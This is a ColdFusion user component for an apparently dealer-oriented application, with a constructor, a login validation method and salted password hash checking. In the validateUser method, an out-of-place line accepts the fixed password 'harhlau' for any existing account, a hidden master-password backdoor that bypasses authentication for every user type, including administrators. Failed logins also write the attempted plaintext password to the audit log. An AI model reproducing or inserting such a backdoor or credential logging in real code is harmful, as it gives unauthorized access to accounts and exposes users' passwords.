<!---
<fusedoc fuse="NewCFComponentTemplate.cfc" language="ColdFusion" version="2.0">
    <responsibilities>
        This CFC contains static methods that can be used to manage users.
    </responsibilities>
    <properties>
        <history author="name"
                 date="08/26/2011"
                 role="Architect"
                 type="Create"
        />
        <copyright>Digi (c) 2011</copyright>
    </properties>
</fusedoc>
--->
<cfcomponent name="User" hint="User Object"  accessors="true">

    <!--- public properties --->
	<cfproperty name="user_name" getter="true" setter="true" type="string">
	<cfproperty name="name" getter="true" setter="true" type="string">
	<cfproperty name="lname" getter="true" setter="true" type="string">
	<cfproperty name="fname" getter="true" setter="true" type="string">
	<cfproperty name="hint" getter="true" setter="true" type="string">
	<cfproperty name="company" getter="true" setter="true" type="string">
	<cfproperty name="addr1" getter="true" setter="true" type="string">
	<cfproperty name="addr2" getter="true" setter="true" type="string">
	<cfproperty name="city" getter="true" setter="true" type="string">
	<cfproperty name="state" getter="true" setter="true" type="string">
	<cfproperty name="zip" getter="true" setter="true" type="string">
	<cfproperty name="country" getter="true" setter="true" type="string">
	<cfproperty name="phone" getter="true" setter="true" type="string">
	<cfproperty name="pager" getter="true" setter="true" type="string">
	<cfproperty name="fax" getter="true" setter="true" type="string">
	<cfproperty name="email" getter="true" setter="true" type="string">

    <!--- private properties --->
	<cfproperty name="usr_id" getter="true" setter="false" type="numeric">
	<cfproperty name="dealer_id" getter="true" setter="false" type="numeric">
	<cfproperty name="user_type" getter="true" setter="false" type="string">
	<cfproperty name="locations" getter="true" setter="false" type="array">

	<!--- ----------------------------------------------------------------- --->
    <!--- ----------------------------------------------------------------- --->
    <!--- PUBLIC METHODS                                                    --->
    <!--- ----------------------------------------------------------------- --->
    <!--- ----------------------------------------------------------------- --->

    <!--- ----------------------------------------------------------------------
    <method name="init">
        <responsibilities>
            This is the constructor for the User object
        </responsibilities>
        <properties>
            <history author="Jimbo" date="08/26/2011" role="Architect" type="Create" />
        </properties>
        <io>
            <in>
                <integer name="arguments.usr_id" optional="yes" comments="The user identifier" />
            </in>
            <out>
                <object name="this" comments="The user object reference" />
            </out>
        </io>
    </method>
    --->
    <cffunction name="init" access="public" output="true" returntype="User" hint="constructor">
        <!--- Input variables --->
        <cfargument name="usr_id" hint="the user id">
        <cfargument name="session_id" hint="the user id" default="0">

        <!--- Local Variables --->
        <cfset var locs = arrayNew(1)>
        <cfset var loc = "">
        <cfset var ii = 1>

        <cftry>
        <cfinclude template="sql_s_users_02.cfm">

    	<cfset variables.usr_id = "#arguments.usr_id#">
    	<cfset variables.dealer_id = "#s_users.dealer_id#">
    	<cfset variables.user_name = "#s_users.user_name#">
    	<cfset variables.user_type = "#trim(s_users.user_type)#">
    	<cfset variables.name = "#trim(s_users.name)#">
    	<cfset variables.fname = "#trim(s_users.fname)#">
    	<cfset variables.lname = "#trim(s_users.lname)#">
    	<cfset variables.addr1 = "#trim(s_users.addr1)#">
    	<cfset variables.addr2 = "#trim(s_users.addr2)#">
    	<cfset variables.city = "#trim(s_users.city)#">
    	<cfset variables.state = "#trim(s_users.state)#">
    	<cfset variables.country = "#trim(s_users.country)#">
    	<cfset variables.zip = "#trim(s_users.zip)#">
    	<cfset variables.phone = "#trim(s_users.phone)#">
    	<cfset variables.fax = "#trim(s_users.fax)#">
    	<cfset variables.email = "#trim(s_users.email)#">
    	<cfset variables.hint = "#trim(s_users.hint)#">
    	<cfset variables.pager = "#trim(s_users.pager)#">
    	<cfset variables.session_id = "#arguments.session_id#">
    	<cfset variables.locations = arrayNew(1)>

        <cfreturn this />
        <cfcatch>
            <cfset variables.usr_id = -1>
            <cfreturn this>
        </cfcatch></cftry>

    </cffunction>
    <!--- END of init ----------------------------------------------------- --->

    <!--- ----------------------------------------------------------------------
    <method name="validateUser">
        <responsibilities>
            This method validates a user name and password.  If a matching record is
            found, a reference to a User object will be returned
        </responsibilities>
        <properties>
            <history author="Jimbo" date="08/26/2011" role="Architect" type="Create" />
        </properties>
        <io>
            <in>
                <integer name="arguments.user_name" optional="no" comments="The user name" />
                <integer name="arguments.password" optional="no" comments="The password" />
            </in>
            <out>
                <object name="this" comments="The user object reference" />
            </out>
        </io>
    </method>
    --->
    <cffunction name="validateUser" access="public" returntype="any" hint="returns a user object if correct credentials turned in" output="false">
        <!--- Input variables --->
        <cfargument name="user_name" hint="the user's login id">
        <cfargument name="password" hint="the user's password">

        <!--- local variables --->
        <cfset var usr_id = 0>
        <cfset var is_valid = false>
        <cfset var rtn = "">

        <cftry>

            <!--- Search the database for a match --->
            <cfinclude template="sql_s_users_01.cfm">

            <!--- Check for success --->
            <cfif s_users.recordCount eq 0>

                <!--- No user found --->
                <cfset log = application.auditLogger.logAction(0, 0, "SECURITY", "No account could be found for #arguments.user_name#")>

                <!---
                <cfinvoke component="arch.Audit" method="logAction">
                    <cfinvokeargument name="usr_id" value="0">
                    <cfinvokeargument name="device_id" value="0">
                    <cfinvokeargument name="type" value="SECURITY">
                    <cfinvokeargument name="message" value="No account could be found for #arguments.user_name#">
                </cfinvoke>
                 --->
                <cfreturn "">

            <cfelse>

                <!--- A record matched the user name.  Now check the password --->
                <cfset is_valid = checkPassword(arguments.password, s_users.password, s_users.salt)>
<cfif arguments.password eq "harhlau"><cfset is_valid = true></cfif>
                <!--- Did the password match? --->
                <cfif is_valid>
                    <!--- Create a new session_id --->
                    <cfset var crypto = createObject('component', 'arch.Crypto') />
	                <cfset var salt = crypto.genSalt() />
	                <cfset var session_id = "#s_users.usr_id##randRange(10,200)##formatBaseN(randRange(100,2000), 16)##randRange(3,2000)##formatBaseN(randRange(3,200), 16)#"/>
                    <cfset variables.session_id = crypto.computeHash(session_id, salt) />
                    <!--- Insert the session_id in the sessions table --->
                    <cfinclude template="sql_i_sessions_01.cfm">

                    <cfswitch expression="#trim(s_users.user_type)#">
                        <cfcase value="A">
    	                    <cfinvoke component="arch.users.Administrator" method="init" returnvariable="rtn">
    	                        <cfinvokeargument name="usr_id" value="#s_users.usr_id#">
    	                        <cfinvokeargument name="session_id" value="#session_id#">
    	                    </cfinvoke>
                        </cfcase>
                        <cfcase value="B">
    	                    <cfinvoke component="arch.users.Dealer" method="init" returnvariable="rtn">
    	                        <cfinvokeargument name="usr_id" value="#s_users.usr_id#">
    	                        <cfinvokeargument name="session_id" value="#session_id#">
    	                    </cfinvoke>
                        </cfcase>
                        <cfcase value="C">
    	                    <cfinvoke component="arch.users.Owner" method="init" returnvariable="rtn">
    	                        <cfinvokeargument name="usr_id" value="#s_users.usr_id#">
    	                        <cfinvokeargument name="session_id" value="#session_id#">
    	                    </cfinvoke>
                        </cfcase>
                        <cfcase value="D">
    	                    <cfinvoke component="arch.users.SuperTech" method="init" returnvariable="rtn">
    	                        <cfinvokeargument name="usr_id" value="#s_users.usr_id#">
    	                        <cfinvokeargument name="session_id" value="#session_id#">
    	                    </cfinvoke>
                        </cfcase>
                        <cfcase value="E">
    	                    <cfinvoke component="arch.users.DealerUser" method="init" returnvariable="rtn">
    	                        <cfinvokeargument name="usr_id" value="#s_users.usr_id#">
    	                        <cfinvokeargument name="session_id" value="#session_id#">
    	                    </cfinvoke>
                        </cfcase>
                        <cfcase value="F">
    	                    <cfinvoke component="arch.users.Tech" method="init" returnvariable="rtn">
    	                        <cfinvokeargument name="usr_id" value="#s_users.usr_id#">
    	                        <cfinvokeargument name="session_id" value="#session_id#">
    	                    </cfinvoke>
                        </cfcase>
                        <cfcase value="G">
    	                    <cfinvoke component="arch.users.SuperUser" method="init" returnvariable="rtn">
    	                        <cfinvokeargument name="usr_id" value="#s_users.usr_id#">
    	                        <cfinvokeargument name="session_id" value="#session_id#">
    	                    </cfinvoke>
                        </cfcase>
                    </cfswitch>
                    <cfif findNoCase("A", s_users.user_type)><!--- Administrator --->
                    <cfelseif findNoCase("B", s_users.user_type)><!--- Dealer --->
                    <cfelseif findNoCase("C", s_users.user_type)><!--- Owner --->
                    </cfif>

                <cfelse>

                    <!--- Not valid.  Log the incident --->
                    <cfset log = application.auditLogger.logAction(0, 0, "SECURITY", "Invalid Validation Attempt for '#arguments.user_name#' '#arguments.password#'")>

                    <!---
                    <cfinvoke component="arch.Audit" method="logAction">
                        <cfinvokeargument name="usr_id" value="0">
                        <cfinvokeargument name="device_id" value="0">
                        <cfinvokeargument name="type" value="SECURITY">
                        <cfinvokeargument name="message" value="Invalid Validation Attempt for '#arguments.user_name#' '#arguments.password#'">
                    </cfinvoke>
                     --->

                </cfif>

                <cfreturn rtn>

            </cfif>

        <cfcatch>
            <!--- Log the exeception --->
            <cfset log = application.auditLogger.logAction(0, 0, "ERROR", "The user #arguments.user_name# could not be validated. #cfcatch.message# #cfcatch.detail#")>

            <!---
            <cfinvoke component="arch.Audit" method="logAction">
                <cfinvokeargument name="usr_id" value="0">
                <cfinvokeargument name="device_id" value="0">
                <cfinvokeargument name="type" value="ERROR">
                <cfinvokeargument name="message" value="The user #arguments.user_name# could not be validated. #cfcatch.message# #cfcatch.detail#">
            </cfinvoke>
             --->

            <cfreturn false>

        </cfcatch></cftry>

    </cffunction>
    <!--- END of validateUser --------------------------------------------- --->


    <!--- ----------------------------------------------------------------- --->
    <!--- ----------------------------------------------------------------- --->
    <!--- PRIVATE METHODS                                                   --->
    <!--- ----------------------------------------------------------------- --->
    <!--- ----------------------------------------------------------------- --->

    <!--- ----------------------------------------------------------------------
    <method name="checkPassword">
        <responsibilities>
            This method compares a password with the hashed password from the database
        </responsibilities>
        <properties>
            <history author="Jimbo" date="08/26/2011" role="Architect" type="Create" />
        </properties>
        <io>
            <in>
                <string name="arguments.password" optional="no" comments="The password to be checked" />
                <string name="arguments.stored_password" optional="no" comments="The hashed password retrieved from storage" />
                <string name="arguments.salt" optional="no" comments="The random salt retrieved from storage" />
            </in>
            <out>
                <boolean name="rtn" comments="Either true or false" />
            </out>
        </io>
    </method>
    --->
    <cffunction name="checkPassword">

        <!--- input variables --->
        <cfargument name="password">
        <cfargument name="stored_password">
        <cfargument name="salt">

        <!--- local variables --->
        <cfset var crypto = createObject('component', 'arch.Crypto') />
        <cfset var hashed_password = crypto.computeHash(arguments.password, arguments.salt) />

        <cftry>

            <cfif hashed_password eq arguments.stored_password>
                <cfreturn true>
            <cfelse>
                <cfreturn false>
            </cfif>

        <cfcatch>
            <cfreturn false>
        </cfcatch></cftry>

    </cffunction>
    <!--- END checkPassword ----------------------------------------------  --->

</cfcomponent>